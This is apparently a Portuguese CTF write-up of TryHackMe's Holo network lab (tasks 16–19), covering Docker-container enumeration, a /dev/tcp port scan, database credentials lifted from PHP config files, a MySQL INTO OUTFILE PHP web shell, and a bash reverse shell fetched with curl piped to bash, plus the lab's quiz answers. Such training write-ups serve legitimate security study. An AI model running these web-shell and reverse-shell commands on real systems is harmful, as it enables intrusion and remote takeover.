> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/writeups/tryhackme/holo-network/docker.md).

# Docker

**Task 16**

Depois de estabilizar o shell, podemos começar com a enumeração pós-exploração, ou seja, encontrar maneiras de escalar privilégios.

Em um sistema Linux padrão, deve estar bastante vazio. No entanto, no contêiner, o arquivo é preenchido com entradas do grupo de controle, podemos confirmar que estamos em uma instância docker&#x20;

```sh
www-data@f3d5e5247683:/var/www/admin$ cat /proc/1/cgroup
cat /proc/1/cgroup
12:freezer:/docker/f3d5e524768348feffab6658b953af06f8cce5141d605b1d2004845d2230653e
11:blkio:/docker/f3d5e524768348feffab6658b953af06f8cce5141d605b1d2004845d2230653e
10:hugetlb:/docker/f3d5e524768348feffab6658b953af06f8cce5141d605b1d2004845d2230653e
9:net_cls,net_prio:/docker/f3d5e524768348feffab6658b953af06f8cce5141d605b1d2004845d2230653e
8:devices:/docker/f3d5e524768348feffab6658b953af06f8cce5141d605b1d2004845d2230653e
7:cpu,cpuacct:/docker/f3d5e524768348feffab6658b953af06f8cce5141d605b1d2004845d2230653e
6:rdma:/
5:perf_event:/docker/f3d5e524768348feffab6658b953af06f8cce5141d605b1d2004845d2230653e
4:cpuset:/docker/f3d5e524768348feffab6658b953af06f8cce5141d605b1d2004845d2230653e
3:pids:/docker/f3d5e524768348feffab6658b953af06f8cce5141d605b1d2004845d2230653e
2:memory:/docker/f3d5e524768348feffab6658b953af06f8cce5141d605b1d2004845d2230653e
1:name=systemd:/docker/f3d5e524768348feffab6658b953af06f8cce5141d605b1d2004845d2230653e
0::/system.slice/containerd.service

```

Podemos verificar o endereço ip do conteiner

```sh
www-data@f3d5e5247683:/var/www/admin$ ifconfig 
ifconfig 
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.100.100  netmask 255.255.255.0  broadcast 192.168.100.255
        ether 02:42:c0:a8:64:64  txqueuelen 0  (Ethernet)
        RX packets 2807  bytes 207794 (207.7 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2111  bytes 5269303 (5.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 428  bytes 240317 (240.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 428  bytes 240317 (240.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

O endereço IP atual é `192.168.100.100`. O gateway do contêiner pode ser determinado com `arp -a`.

```sh
www-data@f3d5e5247683:/var/www/admin$ arp -a
arp -a
ip-192-168-100-1.eu-west-1.compute.internal (192.168.100.1) at 02:42:b2:6e:75:35 [ether] on eth0

```

Agora vamos verificar se existe alguma porta aberta neste container

```sh
www-data@f3d5e5247683:/var/www/admin$ for i in {1..10000};do 2>/dev/null > /dev/tcp/192.168.100.1/$i && echo Port $i open;done
</dev/tcp/192.168.100.1/$i && echo Port $i open;done
Port 22 open
Port 80 open
Port 3306 open
Port 8080 open
```

Aqui, vemos que o gateway possui 4 portas abertas:

* Porta 22 –  SSH
* Porta 80 e Porta 8080 – servidores web
* Porta 3306 –  SQL

Qual é o gateway padrão para o contêiner Docker?

`192.168.100.1`

Qual é a porta web alta aberta no gateway do contêiner?

`8080`

Qual é a porta baixa do banco de dados aberta no  gateway do contêiner?

`3306`

**Task 17**

No `/var/www/wordpress/`diretório, encontramos um arquivo chamado `wp-config.php`. Este arquivo contém credenciais do banco de dados. No entanto, `DB_HOST`refere-se a localhost, que não é nosso alvo. Portanto, essas provavelmente não são as credenciais que desejamos. Ainda os manteremos em mente.

```sh
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'admin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'DBManagerLogin!' );

```

A seguir, no `/var/www/admin`diretório, existe um arquivo chamado `db_connect.php`. Este arquivo contém exatamente o que estávamos procurando! Credenciais de banco de dados para o `DB_SRB` `192.168.100.1`!

```sh
www-data@f3d5e5247683:/var/www/admin$ cat db_connect.php

<?php

define('DB_SRV', '192.168.100.1');
define('DB_PASSWD', "!123SecureAdminDashboard321!");
define('DB_USER', 'admin');
define('DB_NAME', 'DashboardDB');

$connection = mysqli_connect(DB_SRV, DB_USER, DB_PASSWD, DB_NAME);

if($connection == false){

        die("Error: Connection to Database could not be made." . mysqli_connect_error());
}
?>
```

Agora podemos utilizar as credenciais obtidas para nos conectarmos ao servidor SQL em 192.168.100.1

```sh
www-data@2981aa3e2c18:/var/www/admin$ mysql -u admin -p 192.168.100.1
Enter password: 
```

Isso nos dá acesso total ao banco de dados! Agora podemos pesquisar dados confidenciais. O mais interessante para nós seriam algumas credenciais que poderiam ser usadas para acesso SSH ao gateway.

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FzPGctQcfw3OkSBidA3U6%2Fimage.png?alt=media&amp;token=fa653155-6087-44d7-a3d9-c65de2eb8745" alt=""><figcaption></figcaption></figure>

Qual é o endereço do servidor do banco de dados remoto?

`192.168.100.1`

Qual é a senha do banco de dados remoto?

`!123SecureAdminDashboard321!`

Qual é o nome de usuário do banco de dados remoto?

`admin`

Qual é o nome do banco de dados remoto?

`DashboardDB`

Qual nome de usuário pode ser encontrado no próprio banco de dados?

`gurag`

####

#### Exploração do SQL - Task 18

Vamos injetar um código PHP para obter execução de comando.

```
select '<?php $cmd=$_GET["savi"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell_savi.php';
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FrIjLFMto5F6DnAySRTtf%2Fimage.png?alt=media&amp;token=e64d5edb-48a7-4357-9c69-3a6cf6be5396" alt=""><figcaption></figcaption></figure>

Com qual usuário o banco de dados está sendo executado?

`www-data`&#x20;

**Task 19**

Então, vamos estabelecer um shell reverso. Portanto, como pode ser visto na captura de tela abaixo, primeiro criamos uma carga útil de shell reverso. Em seguida, hospedamos essa carga em um arquivo em um servidor HTTP.

```sh
cat shell.sh
#!/bin/bash
bash -i >& /dev/tcp/10.50.74.4/4444 0>&1
```

Agora podemos iniciar um ouvinte usando Netcat ou Metasploit para capturar seu shell reverso depois de executado.

* `nc -lvnp 4444`

Pode usar  o RCE para obter um shell na máquina do alvo. Comando usado:

```url
curl 'http://192.168.100.1:8080/shell_savi.php?savi=curl%20http%3A%2F%2F10.50.74.4%3A900%2Fshell.sh%7Cbash%20%26'
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FIcc72suVetrjdEzyScbt%2Fimage.png?alt=media&amp;token=613dcc43-40ab-4d63-9d58-aeaa0e1d95a3" alt=""><figcaption></figcaption></figure>

E com obtemos o shell reverso em nossa máquina

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FWhRO5WCW8l2wcFwZErHK%2Fimage.png?alt=media&amp;token=99946f3f-b4f8-43fc-bb92-6609f2238219" alt=""><figcaption></figcaption></figure>
